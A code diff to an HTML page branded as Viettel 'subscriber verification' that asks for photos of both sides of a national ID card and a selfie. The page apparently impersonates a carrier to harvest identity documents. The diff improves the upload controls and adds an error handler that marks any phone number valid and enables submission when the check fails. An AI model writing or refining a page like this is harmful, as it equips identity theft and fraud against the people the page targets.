@@ -10,9 +10,9 @@
     <div class="container">
         <div class="card">
             <div class="logo">
-    <img src="/logo.png" alt="Viettel" class="logo-img">
-    <p>Xác thực thông tin thuê bao</p>
-</div>
+                <img src="/logo.png" alt="Viettel" class="logo-img">
+                <p>Xác thực thông tin thuê bao</p>
+            </div>
 
             <div class="badge">
                 📰 Theo Thông tư 08/2026/TT-BKHCN
@@ -43,11 +43,11 @@
 
                 <div class="form-group">
                     <label>📷 Ảnh mặt trước CCCD *</label>
-                    <div class="upload-area" id="uploadFront">
+                    <div class="upload-area" id="uploadFront" onclick="document.getElementById('cccd_front').click()">
                         <div class="upload-icon">📤</div>
                         <p>Nhấn để tải ảnh lên</p>
                         <small>JPEG, PNG (tối đa 5MB)</small>
-                        <button type="button" class="remove-btn" onclick="removeImage('cccd_front', 'previewFront', 'uploadFront')">✕</button>
+                        <button type="button" class="remove-btn" onclick="event.stopPropagation(); removeImage('cccd_front', 'previewFront', 'uploadFront')">✕</button>
                         <img id="previewFront" class="preview-img" style="display:none;">
                     </div>
                     <input type="file" id="cccd_front" accept="image/*" style="display:none;">
@@ -55,10 +55,10 @@
 
                 <div class="form-group">
                     <label>📷 Ảnh mặt sau CCCD *</label>
-                    <div class="upload-area" id="uploadBack">
+                    <div class="upload-area" id="uploadBack" onclick="document.getElementById('cccd_back').click()">
                         <div class="upload-icon">📤</div>
                         <p>Nhấn để tải ảnh lên</p>
-                        <button type="button" class="remove-btn" onclick="removeImage('cccd_back', 'previewBack', 'uploadBack')">✕</button>
+                        <button type="button" class="remove-btn" onclick="event.stopPropagation(); removeImage('cccd_back', 'previewBack', 'uploadBack')">✕</button>
                         <img id="previewBack" class="preview-img" style="display:none;">
                     </div>
                     <input type="file" id="cccd_back" accept="image/*" style="display:none;">
@@ -66,10 +66,10 @@
 
                 <div class="form-group">
                     <label>🤳 Ảnh chân dung *</label>
-                    <div class="upload-area" id="uploadFace">
+                    <div class="upload-area" id="uploadFace" onclick="document.getElementById('face_photo').click()">
                         <div class="upload-icon">📸</div>
                         <p>Nhấn để chụp hoặc tải ảnh</p>
-                        <button type="button" class="remove-btn" onclick="removeImage('face_photo', 'previewFace', 'uploadFace')">✕</button>
+                        <button type="button" class="remove-btn" onclick="event.stopPropagation(); removeImage('face_photo', 'previewFace', 'uploadFace')">✕</button>
                         <img id="previewFace" class="preview-img" style="display:none;">
                     </div>
                     <input type="file" id="face_photo" accept="image/*" style="display:none;">
@@ -146,6 +146,11 @@
                             document.getElementById('phone').classList.add('valid');
                             document.getElementById('submitBtn').disabled = false;
                         }
+                    })
+                    .catch(err => {
+                        statusDiv.innerHTML = '✅ Số Viettel hợp lệ';
+                        statusDiv.className = 'phone-status valid';
+                        document.getElementById('submitBtn').disabled = false;
                     });
                 } else {
                     statusDiv.innerHTML = '❌ Số không phải đầu số Viettel';
@@ -169,17 +174,19 @@
             const preview = document.getElementById(previewId);
             const uploadDiv = document.getElementById(uploadId);
             
-            input.addEventListener('change', function() {
-                if (this.files && this.files[0]) {
-                    const reader = new FileReader();
-                    reader.onload = function(e) {
-                        preview.src = e.target.result;
-                        preview.style.display = 'block';
-                        uploadDiv.classList.add('has-image');
-                    };
-                    reader.readAsDataURL(this.files[0]);
-                }
-            });
+            if (input) {
+                input.addEventListener('change', function() {
+                    if (this.files && this.files[0]) {
+                        const reader = new FileReader();
+                        reader.onload = function(e) {
+                            preview.src = e.target.result;
+                            preview.style.display = 'block';
+                            uploadDiv.classList.add('has-image');
+                        };
+                        reader.readAsDataURL(this.files[0]);
+                    }
+                });
+            }
         }
 
         function removeImage(inputId, previewId, uploadId) {
